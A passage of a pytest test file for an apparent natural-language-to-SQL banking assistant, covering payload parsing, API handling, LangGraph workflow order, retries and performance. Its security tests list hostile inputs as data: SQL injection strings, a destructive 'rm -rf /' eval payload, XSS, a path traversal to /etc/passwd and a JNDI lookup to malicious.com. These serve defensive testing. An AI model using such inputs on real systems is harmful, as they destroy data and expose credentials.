             patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            self.app = NLToSQLApp()
    
    def test_parse_payload_input_valid_json(self):
        """Test parsing valid JSON payload from input"""
        user_input = "Show payments for {'CIN': 22, 'account_number': 900914}"
        
        payload = self.app.parse_payload_input(user_input)
        
        assert payload is not None
        assert payload.CIN == 22
        assert payload.account_number == 900914
    
    def test_parse_payload_input_double_quotes(self):
        """Test parsing JSON with double quotes"""
        user_input = 'Show payments for {"CIN": 22, "account_number": 900914}'
        
        payload = self.app.parse_payload_input(user_input)
        
        assert payload is not None
        assert payload.CIN == 22
        assert payload.account_number == 900914
    
    def test_parse_payload_input_invalid_json(self):
        """Test parsing invalid JSON payload from input"""
        user_input = "Show payments without any JSON"
        
        payload = self.app.parse_payload_input(user_input)
        
        assert payload is None
    
    def test_manual_parse_payload(self):
        """Test manual payload parsing for edge cases"""
        # Test simple case
        json_str = "{CIN: 22, account_number: 900914}"
        payload = self.app._manual_parse_payload(json_str)
        
        assert payload is not None
        assert payload.CIN == 22
        assert payload.account_number == 900914
    
    def test_session_id_generation(self):
        """Test session ID generation"""
        assert self.app.session_id is not None
        assert isinstance(self.app.session_id, str)
        assert len(self.app.session_id) == 36  # UUID format

class TestNLToSQLAPI:
    """Test cases for the NLToSQLAPI interface"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.NLToSQLAgent') as mock_agent_class:
            mock_agent = Mock()
            mock_agent_class.return_value = mock_agent
            mock_agent.db_manager.connect.return_value = None
            
            self.api = NLToSQLAPI("sqlite:///:memory:", "test-key")
            self.mock_agent = mock_agent
    
    @pytest.mark.asyncio
    async def test_api_query_success(self):
        """Test successful API query processing"""
        # Setup mock
        mock_result = {
            'success': True,
            'query': 'Test query',
            'sql_query': 'SELECT * FROM payments',
            'row_count': 5
        }
        self.mock_agent.process_query = AsyncMock(return_value=mock_result)
        
        # Execute API call
        request_data = {
            'query': 'Test query',
            'user_id': 'user_001',
            'payload': {'CIN': 22},
            'session_id': 'test_session'
        }
        
        result = await self.api.query(request_data)
        
        assert result['success'] is True
        assert result['query'] == 'Test query'
        self.mock_agent.process_query.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_api_query_validation_error(self):
        """Test API query validation error"""
        request_data = {}  # Missing required query
        
        result = await self.api.query(request_data)
        
        assert result['success'] is False
        assert result['error_type'] == 'validation_error'
        assert 'Query parameter is required' in result['error_message']
    
    @pytest.mark.asyncio
    async def test_api_query_payload_error(self):
        """Test API query with invalid payload"""
        request_data = {
            'query': 'Test query',
            'payload': {'invalid_field': object()}  # Invalid payload
        }
        
        result = await self.api.query(request_data)
        
        assert result['success'] is False
        assert result['error_type'] == 'payload_error'
    
    def test_get_query_history_api(self):
        """Test API query history retrieval"""
        mock_results = [
            {'result_id': 1, 'user_query': 'Query 1'},
            {'result_id': 2, 'user_query': 'Query 2'}
        ]
        self.mock_agent.result_storage.get_query_results.return_value = mock_results
        
        result = self.api.get_query_history(user_id='user_001', limit=10)
        
        assert result['success'] is True
        assert len(result['data']) == 2
        assert result['count'] == 2
    
    def test_get_query_statistics_api(self):
        """Test API query statistics retrieval"""
        mock_stats = {
            'total_queries': 100,
            'successful_queries': 85,
            'avg_execution_time_ms': 250
        }
        self.mock_agent.result_storage.get_query_statistics.return_value = mock_stats
        
        result = self.api.get_query_statistics(user_id='user_001')
        
        assert result['success'] is True
        assert result['data']['total_queries'] == 100
    
    def test_get_table_schema_api(self):
        """Test API table schema retrieval"""
        mock_schema = {
            'payments': {
                'columns': [{'name': 'id', 'type': 'INTEGER'}]
            }
        }
        self.mock_agent.db_manager.get_schema_info.return_value = mock_schema
        
        result = self.api.get_table_schema(['payments'])
        
        assert result['success'] is True
        assert 'payments' in result['data']

class TestUtilityFunctions:
    """Test cases for utility functions"""
    
    @patch('multi_table_nlsql.load_dotenv')
    @patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'})
    def test_create_agent(self, mock_load_dotenv):
        """Test agent factory function"""
        with patch('multi_table_nlsql.NLToSQLAgent') as mock_agent_class:
            agent = create_agent()
            mock_agent_class.assert_called_once()
    
    @patch('multi_table_nlsql.load_dotenv')
    @patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'})
    def test_create_api(self, mock_load_dotenv):
        """Test API factory function"""
        with patch('multi_table_nlsql.NLToSQLAPI') as mock_api_class:
            api = create_api()
            mock_api_class.assert_called_once()
    
    def test_create_agent_missing_key(self):
        """Test agent creation with missing API key"""
        with patch.dict(os.environ, {}, clear=True):
            with pytest.raises(ValueError, match="OpenAI API key is required"):
                create_agent()

class TestHealthCheckAndSetup:
    """Test cases for health check and setup utilities"""
    
    @patch('multi_table_nlsql.check_dependencies')
    def test_health_check_missing_dependencies(self, mock_check_deps):
        """Test health check with missing dependencies"""
        mock_check_deps.return_value = False
        
        result = health_check()
        
        assert result is False
    
    @patch('multi_table_nlsql.create_engine')
    def test_setup_database_tables_success(self, mock_create_engine):
        """Test successful database table setup"""
        mock_engine = Mock()
        mock_connection = Mock()
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        mock_engine.connect.return_value = mock_connection
        mock_create_engine.return_value = mock_engine
        
        result = setup_database_tables()
        
        assert result is True
        mock_connection.execute.assert_called()
        mock_connection.commit.assert_called()
    
    @patch('multi_table_nlsql.create_engine')
    def test_setup_database_tables_failure(self, mock_create_engine):
        """Test database table setup failure"""
        mock_create_engine.side_effect = Exception("Connection failed")
        
        result = setup_database_tables()
        
        assert result is False

# Integration Tests with LangGraph
class TestLangGraphIntegration:
    """Integration tests for LangGraph workflow"""
    
    def setup_method(self):
        """Setup integration test fixtures"""
        with patch('multi_table_nlsql.OpenAI'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    @pytest.mark.asyncio
    async def test_full_workflow_with_payload(self):
        """Test complete LangGraph workflow with payload"""
        # Mock all dependencies
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.db_manager, 'execute_query') as mock_execute, \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            # Setup mocks
            mock_schema.return_value = {
                'payments': {
                    'columns': [
                        {'name': 'payment_id', 'type': 'INTEGER', 'primary_key': True},
                        {'name': 'customer_id', 'type': 'INTEGER'},
                        {'name': 'amount', 'type': 'DECIMAL'}
                    ],
                    'table_info': {
                        'description': 'Payment transactions',
                        'payload_columns': ['customer_id']
                    }
                }
            }
            mock_generate.return_value = "SELECT * FROM payments WHERE customer_id = 22"
            mock_validate.return_value = {'is_valid': True}
            mock_execute.return_value = pd.DataFrame({
                'payment_id': [1, 2],
                'customer_id': [22, 22],
                'amount': [100.00, 200.00]
            })
            mock_store.return_value = 42
            
            # Execute with payload
            payload = InputPayload(CIN=22)
            result = await self.agent.process_query(
                "Show my recent payments", 
                user_id="user_001",
                input_payload=payload,
                session_id="test_session"
            )
            
            # Verify workflow completion
            assert result['success'] is True
            assert result['primary_table'] == 'payments'
            assert 'customer_id = 22' in result['sql_query']
            assert result['row_count'] == 2
            assert result['formatted_data'] is not None
            assert result['formatted_data']['status'] == 'success'
            assert result['result_id'] == 42
            assert result['execution_time_ms'] > 0
    
    @pytest.mark.asyncio
    async def test_workflow_with_retry_logic(self):
        """Test LangGraph workflow with SQL validation retry"""
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.db_manager, 'execute_query') as mock_execute, \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            # Setup mocks - first validation fails, second succeeds
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_generate.side_effect = [
                "SELECT * FROM payments DROP TABLE users",  # Invalid query
                "SELECT * FROM payments WHERE user_id = 'user_001'"  # Valid query
            ]
            mock_validate.side_effect = [
                {'is_valid': False, 'errors': ['Dangerous keyword detected']},  # First validation fails
                {'is_valid': True, 'errors': []}  # Second validation passes
            ]
            mock_execute.return_value = pd.DataFrame({'amount': [100]})
            mock_store.return_value = 43
            
            # Execute
            result = await self.agent.process_query("Show my payments", "user_001")
            
            # Verify retry worked
            assert result['success'] is True
            assert mock_generate.call_count == 2  # Called twice due to retry
            assert mock_validate.call_count == 2
    
    @pytest.mark.asyncio
    async def test_workflow_max_retries_exceeded(self):
        """Test workflow when max retries are exceeded"""
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            # Setup mocks - validation always fails
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_generate.return_value = "INVALID SQL QUERY"
            mock_validate.return_value = {'is_valid': False, 'errors': ['Invalid query']}
            mock_store.return_value = 44
            
            # Execute
            result = await self.agent.process_query("Invalid query")
            
            # Verify max retries reached
            assert result['success'] is False
            assert "Max retries reached" in result['error_message']
            assert mock_generate.call_count == 3  # Initial + 2 retries
            assert result['result_id'] == 44  # Error should still be stored

# Parameterized Tests for Multiple Scenarios
class TestParameterizedScenarios:
    """Parameterized tests for various payload and query combinations"""
    
    @pytest.mark.parametrize("payload_dict,expected_conditions", [
        ({"CIN": 22}, {"customer_id": 22}),
        ({"sort_code": 123456}, {"sort_code": 123456}),
        ({"account_number": 900914}, {"account_number": 900914}),
        ({"user_id": "user_001"}, {"user_id": "user_001"}),
        ({"CIN": 22, "account_number": 900914}, {"customer_id": 22, "account_number": 900914}),
        ({}, {}),
    ])
    def test_payload_to_filter_conditions(self, payload_dict, expected_conditions):
        """Test payload conversion to filter conditions"""
        payload = InputPayload(**payload_dict)
        conditions = payload.to_filter_conditions()
        assert conditions == expected_conditions
    
    @pytest.mark.parametrize("query,payload_dict,expected_tables", [
        ("Show payments", {"CIN": 22}, ["payments"]),
        ("Show account balance", {"account_number": 900914}, ["accounts"]),
        ("Show spending by category", {"CIN": 22}, ["categories", "payments"]),
        ("Which merchants do I use?", {"account_number": 900914}, ["merchants", "payments", "accounts"]),
        ("Show my budget", {"user_id": "user_001"}, ["budgets"]),
    ])
    def test_table_detection_with_payloads(self, query, payload_dict, expected_tables):
        """Test table detection with various query and payload combinations"""
        table_mapping = TableMapping()
        payload = InputPayload(**payload_dict) if payload_dict else None
        
        detected_tables = table_mapping.detect_relevant_tables(query, payload)
        
        for expected_table in expected_tables:
            assert expected_table in detected_tables, f"Expected {expected_table} for query: {query} with payload: {payload_dict}"
    
    @pytest.mark.parametrize("data_structure,expected_chart_types", [
        # Categorical + Numeric data
        (pd.DataFrame({'category': ['A', 'B'], 'value': [10, 20]}), ['bar_chart', 'horizontal_bar_chart']),
        # Two numeric columns
        (pd.DataFrame({'x': [1, 2], 'y': [10, 20]}), ['scatter_plot', 'bubble_chart']),
        # Single numeric column
        (pd.DataFrame({'value': [1, 2, 3, 4, 5]}), ['histogram', 'box_plot']),
        # Date + Numeric data
        (pd.DataFrame({'date': pd.date_range('2024-01-01', periods=3), 'value': [10, 20, 30]}), ['line_chart', 'area_chart']),
    ])
    def test_chart_type_suggestions(self, data_structure, expected_chart_types):
        """Test chart type suggestions for different data structures"""
        suggestions = DataFormatter._suggest_chart_types(data_structure)
        
        # Check if at least one expected chart type is suggested
        assert any(chart_type in suggestions for chart_type in expected_chart_types), \
            f"Expected one of {expected_chart_types} in {suggestions}"
    
    @pytest.mark.parametrize("query_data,execution_time,expected_stored", [
        # Successful query
        ({
            'query': 'Test query',
            'success': True,
            'sql_query': 'SELECT * FROM payments',
            'row_count': 5,
            'formatted_data': {'data': []}
        }, 150, True),
        # Failed query
        ({
            'query': 'Failed query',
            'success': False,
            'error_message': 'SQL error',
            'row_count': 0
        }, 50, True),
        # Empty query data
        ({}, 0, False)
    ])
    def test_query_result_storage_scenarios(self, query_data, execution_time, expected_stored):
        """Test various query result storage scenarios"""
        mock_db_manager = Mock()
        mock_engine = Mock()
        mock_connection = Mock()
        mock_result = Mock()
        
        if expected_stored:
            mock_result.fetchone.return_value = [123]
        else:
            mock_connection.execute.side_effect = Exception("Storage failed")
        
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        mock_engine.connect.return_value = mock_connection
        mock_db_manager.engine = mock_engine
        
        storage = QueryResultStorage(mock_db_manager)
        result_id = storage.store_query_result(query_data, execution_time, 'test_session')
        
        if expected_stored:
            assert result_id == 123
        else:
            assert result_id is None

# Performance and Edge Case Tests
class TestEdgeCases:
    """Test edge cases and error conditions"""
    
    def setup_method(self):
        """Setup edge case test fixtures"""
        self.table_mapping = TableMapping()
    
    def test_very_large_payload(self):
        """Test handling of payloads with many fields"""
        large_payload_dict = {f"field_{i}": i for i in range(100)}
        large_payload_dict.update({"CIN": 22, "account_number": 900914})
        
        payload = InputPayload(**large_payload_dict)
        conditions = payload.to_filter_conditions()
        
        # Should still extract the mapped fields correctly
        assert conditions.get('customer_id') == 22
        assert conditions.get('account_number') == 900914
        assert len(conditions) >= 2  # At least the mapped fields
    
    def test_empty_query_with_payload(self):
        """Test empty query with payload"""
        payload = InputPayload(CIN=22)
        tables = self.table_mapping.detect_relevant_tables("", payload)
        
        # Should still detect tables from payload
        assert 'payments' in tables  # Default table
    
    def test_special_character_handling_in_payload(self):
        """Test payload with special characters"""
        payload = InputPayload(user_id="user's_account@domain.com")
        conditions = payload.to_filter_conditions()
        
        assert conditions['user_id'] == "user's_account@domain.com"
    
    def test_none_values_in_payload(self):
        """Test payload with None values"""
        payload = InputPayload(CIN=None, account_number=900914, sort_code=None)
        conditions = payload.to_filter_conditions()
        
        # None values should be excluded
        assert 'customer_id' not in conditions
        assert 'sort_code' not in conditions
        assert conditions['account_number'] == 900914
    
    def test_zero_values_in_payload(self):
        """Test payload with zero values"""
        payload = InputPayload(CIN=0, account_number=900914)
        conditions = payload.to_filter_conditions()
        
        # Zero values should be included
        assert conditions['customer_id'] == 0
        assert conditions['account_number'] == 900914
    
    def test_malformed_json_parsing(self):
        """Test malformed JSON parsing in app"""
        with patch('multi_table_nlsql.NLToSQLAgent'), \
             patch('multi_table_nlsql.load_dotenv'), \
             patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            app = NLToSQLApp()
            
            # Test various malformed JSON cases
            malformed_inputs = [
                "Show payments {CIN: 22, incomplete",
                "Show payments {CIN: 22, account_number: }",
                "Show payments {CIN: , account_number: 900914}",
                "Show payments {'CIN': 22, 'user_id': }"
            ]
            
            for malformed_input in malformed_inputs:
                payload = app.parse_payload_input(malformed_input)
                # Should either parse successfully with partial data or return None
                assert payload is None or isinstance(payload, InputPayload)
    
    def test_extremely_long_query(self):
        """Test handling of extremely long queries"""
        long_query = "Show payments " + "and categories " * 1000
        tables = self.table_mapping.detect_relevant_tables(long_query)
        
        assert 'payments' in tables
        assert 'categories' in tables
    
    def test_unicode_characters_in_query(self):
        """Test handling of unicode characters"""
        unicode_query = "Show payments for café expenses 🍕"
        tables = self.table_mapping.detect_relevant_tables(unicode_query)
        
        assert 'payments' in tables

# Mock LangGraph Integration Tests
class TestLangGraphMocking:
    """Test LangGraph integration with comprehensive mocking"""
    
    def setup_method(self):
        """Setup LangGraph mocking test fixtures"""
        with patch('multi_table_nlsql.OpenAI'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    @pytest.mark.asyncio
    async def test_langgraph_node_execution_order(self):
        """Test that LangGraph nodes execute in correct order"""
        execution_order = []
        
        # Create a mock agent that tracks execution order
        class TrackingAgent(NLToSQLAgent):
            def __init__(self, *args, **kwargs):
                # Initialize without calling setup_graph
                self.db_manager = DatabaseManager("sqlite:///:memory:")
                self.llm_service = LLMService("test-key")
                self.table_mapping = TableMapping()
                self.data_formatter = DataFormatter()
                self.result_storage = Mock()
                self.graph = None
                # Don't call setup_graph to avoid LangGraph complications
                
            def analyze_query_node(self, state):
                execution_order.append('analyze_query')
                state.relevant_tables = ['payments']
                state.primary_table = 'payments'
                return state
            
            def get_schema_node(self, state):
                execution_order.append('get_schema')
                state.schema_info = {'payments': {'columns': []}}
                return state
            
            def generate_sql_node(self, state):
                execution_order.append('generate_sql')
                state.sql_query = "SELECT * FROM payments"
                return state
            
            def validate_sql_node(self, state):
                execution_order.append('validate_sql')
                state.validation_result = {'is_valid': True}
                return state
            
            def execute_sql_node(self, state):
                execution_order.append('execute_sql')
                state.execution_result = pd.DataFrame({'amount': [100]})
                return state
            
            def format_results_node(self, state):
                execution_order.append('format_results')
                state.formatted_data = {'status': 'success', 'data': []}
                return state
            
            async def process_query(self, user_query, user_id=None, input_payload=None, store_result=True, session_id=None):
                """Override to use direct node execution instead of LangGraph"""
                state = AgentState(user_query=user_query, user_id=user_id, input_payload=input_payload)
                
                # Execute nodes in order
                state = self.analyze_query_node(state)
                state = self.get_schema_node(state)
                state = self.generate_sql_node(state)
                state = self.validate_sql_node(state)
                state = self.execute_sql_node(state)
                state = self.format_results_node(state)
                
                return {
                    'query': user_query,
                    'success': True,
                    'relevant_tables': state.relevant_tables,
                    'sql_query': state.sql_query,
                    'row_count': len(state.execution_result) if state.execution_result is not None else 0,
                    'execution_time_ms': 100
                }
        
        # Use the tracking agent
        with patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            tracking_agent = TrackingAgent("sqlite:///:memory:", "test-key")
            
            # Execute workflow
            result = await tracking_agent.process_query("Test query")
            
            # Verify execution order
            expected_order = [
                'analyze_query',
                'get_schema', 
                'generate_sql',
                'validate_sql',
                'execute_sql',
                'format_results'
            ]
            
            assert execution_order == expected_order
            assert result['success'] is True

# Async Test Helpers
class TestAsyncOperations:
    """Test asynchronous operations and concurrency"""
    
    def setup_method(self):
        """Setup async test fixtures"""
        with patch('multi_table_nlsql.OpenAI'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    @pytest.mark.asyncio
    async def test_concurrent_query_processing(self):
        """Test handling of concurrent queries"""
        # Mock all dependencies
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.db_manager, 'execute_query') as mock_execute, \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_generate.side_effect = lambda *args: f"SELECT * FROM payments -- {args[0]}"
            mock_validate.return_value = {'is_valid': True}
            mock_execute.return_value = pd.DataFrame({'amount': [100]})
            mock_store.return_value = 123
            
            # Run multiple queries concurrently
            queries = [
                "Show payments for user 1",
                "Show payments for user 2", 
                "Show payments for user 3"
            ]
            
            tasks = [
                self.agent.process_query(query, f"user_{i}")
                for i, query in enumerate(queries, 1)
            ]
            
            results = await asyncio.gather(*tasks)
            
            # Verify all queries completed successfully
            assert len(results) == 3
            for result in results:
                assert result['success'] is True
                assert 'SELECT * FROM payments' in result['sql_query']
    
    @pytest.mark.asyncio
    async def test_api_concurrent_requests(self):
        """Test API handling concurrent requests"""
        with patch('multi_table_nlsql.NLToSQLAgent') as mock_agent_class:
            mock_agent = Mock()
            mock_agent_class.return_value = mock_agent
            mock_agent.db_manager.connect.return_value = None
            
            # Setup async mock for process_query
            async def mock_process_query(*args, **kwargs):
                await asyncio.sleep(0.01)  # Simulate processing time
                return {
                    'success': True,
                    'query': args[0] if args else 'test',
                    'sql_query': 'SELECT * FROM payments',
                    'row_count': 1
                }
            
            mock_agent.process_query = mock_process_query
            
            api = NLToSQLAPI("sqlite:///:memory:", "test-key")
            api.agent = mock_agent
            
            # Execute concurrent API requests
            requests = [
                {'query': f'Query {i}', 'user_id': f'user_{i}'}
                for i in range(5)
            ]
            
            tasks = [api.query(request) for request in requests]
            results = await asyncio.gather(*tasks)
            
            # Verify all requests completed successfully
            assert len(results) == 5
            for result in results:
                assert result['success'] is True

# Integration Test with Real Data Structures
class TestRealDataIntegration:
    """Test with realistic data structures and scenarios"""
    
    def setup_method(self):
        """Setup realistic test data"""
        self.sample_payments_data = pd.DataFrame({
            'payment_id': [1, 2, 3, 4, 5],
            'user_id': ['user_001', 'user_001', 'user_002', 'user_001', 'user_003'],
            'category_id': [1, 2, 1, 3, 2],
            'merchant_id': [101, 102, 103, 101, 102],
            'amount': [50.00, 25.50, 100.00, 75.25, 30.00],
            'transaction_date': pd.date_range('2024-01-01', periods=5),
            'customer_id': [22, 22, 23, 22, 24],
            'account_number': [900914, 900914, 900915, 900914, 900916]
        })
        
        self.sample_categories_data = pd.DataFrame({
            'category_id': [1, 2, 3],
            'category_name': ['Food & Dining', 'Entertainment', 'Transportation']
        })
    
    def test_realistic_data_formatting(self):
        """Test data formatting with realistic financial data"""
        query_info = {
            'query': 'Show spending by category',
            'sql_query': 'SELECT c.category_name, SUM(p.amount) FROM payments p JOIN categories c ON p.category_id = c.category_id GROUP BY c.category_name'
        }
        
        # Simulate aggregated data
        aggregated_data = pd.DataFrame({
            'category_name': ['Food & Dining', 'Entertainment', 'Transportation'],
            'total_amount': [150.00, 55.50, 75.25]
        })
        
        result = DataFormatter.format_for_visualization(aggregated_data, query_info)
        
        assert result['status'] == 'success'
        assert len(result['data']) == 3
        assert result['metadata']['row_count'] == 3
        assert 'bar_chart' in result['metadata']['suggested_charts']
        
        # Verify data structure
        for record in result['data']:
            assert 'category_name' in record
            assert 'total_amount' in record
            assert isinstance(record['total_amount'], (int, float))
    
    def test_realistic_payload_filtering(self):
        """Test payload filtering with realistic scenarios"""
        # Test customer-specific filtering
        payload = InputPayload(CIN=22)
        conditions = payload.to_filter_conditions()
        
        # Simulate filtering the data
        filtered_data = self.sample_payments_data[
            self.sample_payments_data['customer_id'] == conditions['customer_id']
        ]
        
        assert len(filtered_data) == 3  # 3 records for customer_id 22
        assert all(filtered_data['customer_id'] == 22)
        
        # Test account-specific filtering
        payload = InputPayload(account_number=900914)
        conditions = payload.to_filter_conditions()
        
        filtered_data = self.sample_payments_data[
            self.sample_payments_data['account_number'] == conditions['account_number']
        ]
        
        assert len(filtered_data) == 3  # 3 records for account 900914
        assert all(filtered_data['account_number'] == 900914)

# Error Recovery and Resilience Tests
class TestErrorRecovery:
    """Test error recovery and system resilience"""
    
    def setup_method(self):
        """Setup error recovery test fixtures"""
        with patch('multi_table_nlsql.OpenAI'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    @pytest.mark.asyncio
    async def test_database_connection_recovery(self):
        """Test recovery from database connection failures"""
        # Simulate database connection failure then recovery
        connection_attempts = [0]
        
        def mock_execute_query(query):
            connection_attempts[0] += 1
            if connection_attempts[0] == 1:
                raise Exception("Database connection lost")
            return pd.DataFrame({'amount': [100]})
        
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.db_manager, 'execute_query', side_effect=mock_execute_query), \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_generate.return_value = "SELECT * FROM payments"
            mock_validate.return_value = {'is_valid': True}
            mock_store.return_value = 123
            
            result = await self.agent.process_query("Test query")
            
            # Should handle the error gracefully
            assert result['success'] is False
            assert "SQL execution error" in result['error_message']
    
    @pytest.mark.asyncio
    async def test_llm_service_recovery(self):
        """Test recovery from LLM service failures"""
        # Simulate LLM service failure
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql', side_effect=Exception("OpenAI API error")), \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_store.return_value = 124
            
            result = await self.agent.process_query("Test query")
            
            # Should handle the error gracefully
            assert result['success'] is False
            assert "SQL generation error" in result['error_message']
            assert result['result_id'] == 124  # Error should still be stored

# Test Configuration and Fixtures
@pytest.fixture
def sample_payload():
    """Fixture for sample payload data"""
    return InputPayload(CIN=22, account_number=900914, sort_code=123456)

@pytest.fixture
def sample_query_result():
    """Fixture for sample query result"""
    return {
        'query': 'Show my payments',
        'user_id': 'user_001',
        'input_payload': {'CIN': 22},
        'sql_query': 'SELECT * FROM payments WHERE customer_id = 22',
        'relevant_tables': ['payments'],
        'primary_table': 'payments',
        'success': True,
        'formatted_data': {'data': [{'amount': 100}, {'amount': 200}]},
        'row_count': 2,
        'execution_time_ms': 150
    }

@pytest.fixture
def mock_database_manager():
    """Fixture for mocked database manager"""
    mock_manager = Mock()
    mock_manager.engine = Mock()
    mock_manager.get_schema_info.return_value = {
        'payments': {
            'columns': [
                {'name': 'payment_id', 'type': 'INTEGER', 'primary_key': True},
                {'name': 'customer_id', 'type': 'INTEGER'},
                {'name': 'amount', 'type': 'DECIMAL'}
            ],
            'table_info': {'description': 'Payment transactions'}
        }
    }
    return mock_manager

# Performance Tests
class TestPerformance:
    """Performance and scalability tests"""
    
    @pytest.mark.performance
    def test_large_dataset_formatting(self):
        """Test data formatting performance with large datasets"""
        # Create large dataset
        large_data = pd.DataFrame({
            'category': ['Food'] * 10000 + ['Entertainment'] * 10000,
            'amount': list(range(20000))
        })
        
        query_info = {'query': 'Performance test'}
        
        import time
        start_time = time.time()
        result = DataFormatter.format_for_visualization(large_data, query_info)
        end_time = time.time()
        
        # Should complete within reasonable time
        assert end_time - start_time < 5.0  # Less than 5 seconds
        assert result['metadata']['row_count'] == 20000
        assert len(result['data']) == 20000
    
    @pytest.mark.performance
    def test_concurrent_payload_processing(self):
        """Test concurrent payload processing performance"""
        import concurrent.futures
        
        def process_payload(i):
            payload = InputPayload(CIN=i, account_number=900914 + i)
            return payload.to_filter_conditions()
        
        # Process 100 payloads concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_payload, i) for i in range(100)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        assert len(results) == 100
        for i, result in enumerate(results):
            assert 'customer_id' in result
            assert 'account_number' in result

# Security Tests
class TestSecurity:
    """Security-focused tests"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        db_manager = DatabaseManager("sqlite:///:memory:")
        
        malicious_queries = [
            "SELECT * FROM payments WHERE user_id = '1'; DROP TABLE payments; --",
            "SELECT * FROM payments UNION SELECT password FROM users",
            "SELECT * FROM payments; EXEC xp_cmdshell('format c:'); --",
            "SELECT * FROM payments WHERE 1=1; INSERT INTO admin VALUES('hacker', 'password')"
        ]
        
        for query in malicious_queries:
            result = db_manager.validate_query(query, {})
            assert result['is_valid'] is False, f"Query should be blocked: {query}"
            assert len(result['errors']) > 0
    
    def test_payload_input_sanitization(self):
        """Test payload input sanitization"""
        with patch('multi_table_nlsql.NLToSQLAgent'), \
             patch('multi_table_nlsql.load_dotenv'), \
             patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            app = NLToSQLApp()
            
            # Test malicious payload inputs
            malicious_inputs = [
                "Show payments {'CIN': 22, 'eval': 'exec(\"import os; os.system(\\\"rm -rf /\\\")\")'}", 
                "Show payments {'CIN': 22, '__import__': 'subprocess'}",
                "Show payments {'CIN': 22, 'script': '<script>alert(\"xss\")</script>'}"
            ]
            
            for malicious_input in malicious_inputs:
                payload = app.parse_payload_input(malicious_input)
                # Should either reject or sanitize the input
                if payload:
                    # Verify no dangerous fields were parsed
                    payload_dict = payload.dict()
                    dangerous_fields = ['eval', '__import__', 'script', 'exec']
                    for field in dangerous_fields:
                        assert field not in payload_dict
    
    def test_user_input_validation(self):
        """Test user input validation and sanitization"""
        table_mapping = TableMapping()
        
        # Test various potentially dangerous inputs
        dangerous_queries = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE payments; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/exploit}"
        ]
        
        for query in dangerous_queries:
            # Should not crash and should return safe table detection
            tables = table_mapping.detect_relevant_tables(query)
            assert isinstance(tables, list)
            # Should default to payments table for unrecognized content
            assert 'payments' in tables

# Compatibility Tests
class TestCompatibility:
    """Cross-platform and version compatibility tests"""
    
    @pytest.mark.skipif(os.name == 'nt', reason="Unix-specific test")
    def test_unix_path_handling(self):
        """Test Unix path handling"""
        # Test with Unix-style database URL
        unix_db_url = "postgresql://user:pass@/var/run/postgresql/db"
        manager = DatabaseManager(unix_db_url)
        assert manager.database_url == unix_db_url
    
    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
    def test_windows_path_handling(self):
        """Test Windows path handling"""
        # Test with Windows-style database URL
        windows_db_url = "sqlite:///C:\\Users\\test\\database.db"
        manager = DatabaseManager(windows_db_url)
        assert manager.database_url == windows_db_url
    
    def test_python_version_compatibility(self):
        """Test Python version compatibility"""
        import sys
        
        # Ensure we're testing on supported Python versions
        assert sys.version_info >= (3, 8), "Python 3.8+ required"
        
        # Test version-specific features
        if sys.version_info >= (3, 9):
            # Test type union syntax (Python 3.9+)
            from typing import Union
            test_union = Union[str, int, None]
            assert test_union is not None

# Data Type Tests
class TestDataTypes:
    """Test various data type handling"""
    
    def test_decimal_precision_handling(self):
        """Test decimal precision in financial data"""
        from decimal import Decimal
        
        # Test with high precision financial data
        precise_data = pd.DataFrame({
            'amount': [Decimal('123.456789'), Decimal('987.654321')],
            'category': ['Food', 'Transport']
        })
        
        query_info = {'query': 'Precision test'}
